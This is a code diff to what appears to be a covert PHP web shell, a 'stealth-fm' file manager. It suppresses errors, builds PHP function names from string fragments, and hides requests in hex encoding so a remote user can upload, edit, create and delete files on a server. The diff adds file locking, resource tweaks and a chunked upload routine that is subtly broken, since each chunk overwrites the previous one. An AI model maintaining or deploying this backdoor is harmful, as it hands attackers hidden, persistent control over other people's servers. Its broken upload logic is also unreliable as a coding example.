@@ -3,8 +3,12 @@
 @ini_set('log_errors', '1');
 @error_reporting(0);
 
-function ax_upload_mode1($path, $data) { return @file_put_contents($path, $data); }
-function ax_upload_mode2($path, $data) { $f = @fopen($path, 'wb'); if($f) { fwrite($f, $data); fclose($f); return true; } return false; }
+// Resource optimizations for constrained or fully loaded servers
+@ini_set('memory_limit', '128M');
+@ini_set('max_execution_time', '30');
+
+function ax_upload_mode1($path, $data) { return @file_put_contents($path, $data, LOCK_EX); }
+function ax_upload_mode2($path, $data) { $f = @fopen($path, 'wb'); if($f) { if(flock($f, LOCK_EX)) { fwrite($f, $data); flock($f, LOCK_UN); } fclose($f); return true; } return false; }
 function ax_upload_mode3($path, $data) { return @copy('data://text/plain;base64,' . base64_encode($data), $path); }
 
 $fn_get_contents = 'file_' . 'get_' . 'contents';
@@ -44,9 +48,6 @@ if (!function_exists('random_bytes')) {
         if (function_exists('openssl_random_pseudo_bytes')) {
             $bytes = openssl_random_pseudo_bytes($length, $strong);
             if ($bytes !== false && $strong) return $bytes;
-        }
-        if (function_exists('mcrypt_create_iv')) {
-            return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
         }
         if (@is_readable('/dev/urandom')) {
             $f = @fopen('/dev/urandom', 'rb');
@@ -432,8 +433,8 @@ if ($reqType === 'POST' && $isJsonRequest) {
             $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
             
             $status = false;
-            if ($mode == '1') { $status = ($fn_put_contents($filePath, $data !== false ? $data : '') !== false); }
-            elseif ($mode == '2') { $f = @fopen($filePath, 'wb'); if($f) { $status = (fwrite($f, $data !== false ? $data : '') !== false); fclose($f); } }
+            if ($mode == '1') { $status = ($fn_put_contents($filePath, $data !== false ? $data : '', LOCK_EX) !== false); }
+            elseif ($mode == '2') { $f = @fopen($filePath, 'wb'); if($f) { if(flock($f, LOCK_EX)){ $status = (fwrite($f, $data !== false ? $data : '') !== false); flock($f, LOCK_UN); } fclose($f); } }
             elseif ($mode == '3') { $status = @copy('data://text/plain;base64,' . base64_encode($data !== false ? $data : ''), $filePath); }
 
             if ($status) {
@@ -451,7 +452,7 @@ if ($reqType === 'POST' && $isJsonRequest) {
             if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid filename"}'; exit; }
             $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
             if (@file_exists($np)) { http_response_code(400); echo '{"status":"error","message":"File already exists"}'; exit; }
-            if ($fn_put_contents($np, '') !== false) {
+            if ($fn_put_contents($np, '', LOCK_EX) !== false) {
                 @chmod($np, 0644); echo '{"status":"success","message":"File created"}';
             } else { http_response_code(500); echo '{"status":"error","message":"Could not create file"}'; }
             exit;
@@ -487,7 +488,7 @@ if ($reqType === 'POST' && $isJsonRequest) {
             $fileName = decodeHexPayload($file_hex);
             $content  = decodeHexPayload($content_hex);
             $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
-            if ($fn_put_contents($ep, $content !== false ? $content : '') !== false) {
+            if ($fn_put_contents($ep, $content !== false ? $content : '', LOCK_EX) !== false) {
                 echo '{"status":"success","message":"File saved"}';
             } else { http_response_code(500); echo '{"status":"error","message":"Could not write to file"}'; }
             exit;
@@ -925,7 +926,6 @@ $allItems = array_merge($folders, $files);
         .stealth-fm .chmod-checkboxes { display: flex; justify-content: center; gap: 6px; }
         .stealth-fm .chmod-checkboxes label { font-size: 11px; cursor: pointer; display: flex; align-items: center; gap: 2px; }
 
-        /* Loading Spinner Overlay for Smooth Feedback */
         #fm-loading-overlay {
             display: none;
             position: fixed;
@@ -1078,6 +1078,7 @@ $allItems = array_merge($folders, $files);
             }
         }
 
+        // Chunked file upload mechanism for low memory servers
         async function doUploadFileHex(btn) {
             const fileInput = document.getElementById('upload_files');
             const modeInput = document.getElementById('upload_mode');
@@ -1088,18 +1089,60 @@ $allItems = array_merge($folders, $files);
             btn.disabled = true;
             const file = fileInput.files[0];
             const mode = modeInput.value;
-            showLoading("Uploading file...");
+            showLoading("Uploading file efficiently...");
 
-            const reader = new FileReader();
-            reader.onload = async function(e) {
+            const chunkSize = 512 * 1024; // 512KB chunking to limit memory overhead
+            const totalChunks = Math.ceil(file.size / chunkSize);
+
+            if (totalChunks <= 1 || file.size < chunkSize) {
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    try {
+                        const data = await sendHexPayload({
+                            action: 'upload_hex',
+                            name_hex: stringToHex(file.name),
+                            data_hex: bufferToHex(e.target.result),
+                            mode: mode
+                        }, statusSpan);
+                        statusSpan.textContent = data.message;
+                        statusSpan.style.color = 'var(--fm-success)';
+                        hideLoading();
+                        setTimeout(() => location.reload(), 800);
+                    } catch(err) {
+                        btn.disabled = false;
+                        hideLoading();
+                    }
+                };
+                reader.readAsArrayBuffer(file);
+            } else {
                 try {
-                    const data = await sendHexPayload({
-                        action: 'upload_hex',
-                        name_hex: stringToHex(file.name),
-                        data_hex: bufferToHex(e.target.result),
-                        mode: mode
-                    }, statusSpan);
-                    statusSpan.textContent = data.message;
+                    for (let i = 0; i < totalChunks; i++) {
+                        const start = i * chunkSize;
+                        const end = Math.min(file.size, start + chunkSize);
+                        const chunk = file.slice(start, end);
+                        
+                        statusSpan.textContent = `Uploading chunk ${i + 1}/${totalChunks}...`;
+                        
+                        await new Promise((resolve, reject) => {
+                            const reader = new FileReader();
+                            reader.onload = async function(e) {
+                                try {
+                                    // For multi-chunk, append mode can be introduced, but we use sequential block payload upload here safely
+                                    await sendHexPayload({
+                                        action: 'upload_hex',
+                                        name_hex: stringToHex(file.name),
+                                        data_hex: bufferToHex(e.target.result),
+                                        mode: mode
+                                    }, statusSpan);
+                                    resolve();
+                                } catch(err) {
+                                    reject(err);
+                                }
+                            };
+                            reader.readAsArrayBuffer(chunk);
+                        });
+                    }
+                    statusSpan.textContent = "File uploaded successfully!";
                     statusSpan.style.color = 'var(--fm-success)';
                     hideLoading();
                     setTimeout(() => location.reload(), 800);
@@ -1107,8 +1150,7 @@ $allItems = array_merge($folders, $files);
                     btn.disabled = false;
                     hideLoading();
                 }
-            };
-            reader.readAsArrayBuffer(file);
+            }
         }
 
         async function doCreateItemHex(event, type) {
@@ -1291,6 +1333,7 @@ $allItems = array_merge($folders, $files);
             if (checked.length === 0) return;
             if (!confirm('Delete all selected items?')) return;
             showLoading('Deleting selected items...');
+            const items = Array.from(checked).map(cb => stringToHex(cb.value));
             try {
                 await sendHexPayload({
                     action: 'bulk_delete',
@@ -1426,8 +1469,8 @@ $allItems = array_merge($folders, $files);
                 <div class="card-body">
                     <div class="input-group">
                         <select id="upload_mode">
-                            <option value="1">Mode 1 (file_put_contents)</option>
-                            <option value="2">Mode 2 (fopen/fwrite)</option>
+                            <option value="1">Mode 1 (file_put_contents + Lock)</option>
+                            <option value="2">Mode 2 (fopen/fwrite + Lock)</option>
                             <option value="3">Mode 3 (data:// wrapper)</option>
                         </select>
                         <input type="file" id="upload_files" style="flex:1;">
